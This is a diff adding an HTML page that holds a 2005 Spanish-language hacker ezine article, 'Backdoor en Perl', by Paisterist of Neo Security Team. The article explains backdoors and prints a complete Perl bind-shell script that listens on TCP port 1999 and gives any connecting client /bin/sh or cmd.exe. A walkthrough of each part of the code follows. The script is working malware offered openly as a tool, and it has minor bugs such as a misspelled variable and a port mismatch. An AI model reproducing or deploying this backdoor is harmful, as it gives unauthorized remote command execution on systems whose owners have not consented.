@@ -1,0 +1,136 @@
+<html>
+<head>
+<title>Backdoor en Perl</title>
+<style>
+body{
+	  filter:alpha(opacity=90);
+      -moz-opacity:0.9;
+      opacity:0.9;
+      -khtml-opacity:0.9;
+      }
+code {
+    background-color: #FFFFF0;
+    color: #000000;
+	border: 1px solid #FFFFFF;
+	font-family: Verdana;
+	font-size: 10px;
+	font-style: normal;
+	font-weight: normal;
+	font-variant: normal;
+	display: block;
+	text-align: left;
+	vertical-align: top;
+	cell-padding: 4;
+	letter-spacing: normal;
+}
+span {
+	color: #00FF00;
+	font-size: 18px;
+	font-weight: bold;
+	text-decoration: underline;
+}
+a {
+	color: #CCCCCC;	
+}
+a:hover {
+	color: #EEEEEE;
+	font-weight: bold;
+}
+a:visited {
+	color: #CCCCCC;	
+}
+a:active {
+	color: #CCCCCC;	
+}
+</style>
+</head>
+<body bgcolor=#000000 text=#FFFFFF>
+<div align=center><h2>Backdoor en Perl</h2></div>
+/*<br>
+<b>Author:</b> Paisterist<br>
+<b>Date:</b> 16/04/05<br>
+[N]eo [S]</b>ecurity [T]eam © 2004-2005<br>
+*/<br><br>
+<b>
+[+] - ¿Qué es un backdoor?<br>
+[+] - Codeando el Backdoor<br>
+[+] - Despedida<br></b><br>
+Para leer este artículo no es necesario que sean expertos en Perl, aunque sería conveniente que supieran lo básico del lenguaje. Si bien muchos critican a Perl y aquellas personas que lo usan para codear herramientas como esta, u otras cosas parecidas (como un scanner de puertos), a mí me parece que es demasiado prático y portátil (de hecho es multiplataforma).<br><br>
+<span>¿Qué es un backdoor?</span><br><br>
+Un backdoor es un programa que deja una "puerta trasera" (back door) en un sistema. Esta puerta trasera puede ser, por ejemplo, un puerto abierto en el que está bindeada una shell. De esta manera, si intentáramos conectarnos de cualquier forma a ese puerto, obtendríamos la shell, con la que podríamos ejecutar comandos en el servidor remoto.<br><br>
+<span>Codeando el backdoor</span><br><br>
+Como dice el título, en esta parte vamos a programar el backdoor. A continuación les dejo el código y después lo explico.<br><br>
+<b>backdoor.pl:</b><br>
+
+<code>#!/usr/bin/perl<br>
+<br>
+###########################################<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NST Backdoor by Paisterist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Usage: perl nstback.pl &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note: the amphersand is for background execution in Linux&nbsp;&nbsp;&nbsp;#<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>
+#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connect: telnet host 666&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>						 
+###########################################<br>
+use Socket;<br>
+<br>
+$port= 1999;<br>
+$proto="tcp";<br>
+$ckeck=`uname &`;<br>
+$check_win=`ver`;<br>
+if ($check =~ "Linux") {<br>
+system("clear");<br>
+$system="/bin/sh";<br>
+} else {<br>
+if ($check_win =~ /XP/){<br>
+system("cls");<br>
+$system="C:\\Windows\\system32\\cmd.exe";<br>
+}<br>
+else {<br>
+system("cls");<br>
+$system="C:\\Windows\\system32\\command.com";<br>
+}<br>
+}<br>
+<br>
+socket(SERVER, AF_INET, SOCK_STREAM, $proto);<br>
+setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack(l, 1)) or die;<br>
+bind(SERVER, sockaddr_in($port, INADDR_ANY)) or die;<br>
+listen(SERVER, "10") or die;<br>
+for(; $paddr = accept(CLIENT, SERVER); close CLIENT) {<br>
+  open(STDIN, ">&CLIENT");<br> 
+  open(STDOUT, ">&CLIENT");<br>
+  open(STDERR, ">&CLIENT");<br>
+  system($system);<br>
+  close(STDIN);<br>
+  close(STDOUT);<br>
+  close(STDERR);<br>
+}<br></code><br><br>
+
+En primer lugar, con el #!/usr/bin/perl definimos la ruta del intérprete de Perl (en Windows hubiera sido algo así como C:\perl\bin\perl.exe). Después de eso, con use Socket; aclaramos que vamos a usar el módulo para el uso de Sockets. Luego definimos el puerto en el que se binderá la shell y el protocolo que usaremos para la conexión (TCP). Una cosa importante a remarcar es que no hay que usar un puerto entre 1 y 1024 ya que la apertura de cualquiera de estos puertos requiere privilegios de root.<br><br>
+Con el código que sigue chequeamos el sistema operativo del sistema. Para eso ejecutamos el comando uname y, si como salida de Linux la shell será /bin/bash. En caso contrario, nos fijamos qué versión de Windows se está usando mediante el comando ver.<br><br>
+
+Después de esto empieza la conexión. Con la línea socket(SERVER, AF_INET, SOCK_STREAM, $proto); creamos la socket. En 
+primer lugar ponemos el nombre de la socket, SOCKET, en segundo lugar la familia de direcciones del protocolo TPC/IP, AF_INET
+ (si usáramos dominios Unix sería AF_UNIX), en tercer lugar SOCK_STREAM indica que se usará el protocolo TCP (SOCK_DGRAM para UDP) y por último, especificamos el puerto en el que se creará la socket.<br><br>
+
+A continuación bindeamos la socket a un puerto, mediante la función bind() que recibe el nombre de la socket creada, SOCKET, y 
+sockaddr_in($port, INADDR_ANY) que indica que se bindeará la socket en todos los puertos para los que fue declarada (en este 
+caso el 1999). Luego ponemos el programa a la escucha mediante la función listen() que recibe como primer parámetro el nombre 
+ de la socket y como último la cantidad máxima de conexiones simultáneas, 10 en este caso (esto pueden modificarlo ustedes a su gusto).<br><br>
+Si alguien trata de conectarse por el puerto al que bindeamos la socket, lo aceptamos con accept() que recibe el nombre de la
+ nueva socket, en este caso CLIENT, y el nombre de la socket que recibe la conexión, SOCKET en este caso.<br><br>
+
+Por último, el bucle del final del código lo que hace es, por cada conexión entrante, abrir los flujos de entrada, salida y de error y ejecuta la shell con la función system(), que ejecuta comandos en el servidor. Después de eso, cierra los flujos.<br><br>
+
+
+<span>Despedida</span><br><br>
+
+
+Como en todas las ezines voy a poner algo de Perl, los espero en la próxima con alguna otra herramienta codeada en este práctico lenguaje. sin más que decir, me despido. Hasta la próxima!<br><br>
+
+<b>By Paisterist</b><br><br>
+<b>Contacto:</b> paisterist[at]gmail[dot].com<br>
+<b>[N]</b>eo &nbsp;<b>[S]</b>ecurity&nbsp;<b>[T]</b>eam&nbsp;&nbsp; --> <a target="_blank" href=http://neosecurityteam.net>http://neosecurityteam.net</a> --> <a target="_blank" href=http://neosecurityteam.net/foro.php>http://neosecurityteam.net/foro.php</a>
+<p><i><b><font size="1" face="Verdana">/* EOF */</font></b></i></p>
+</body>
+</html>
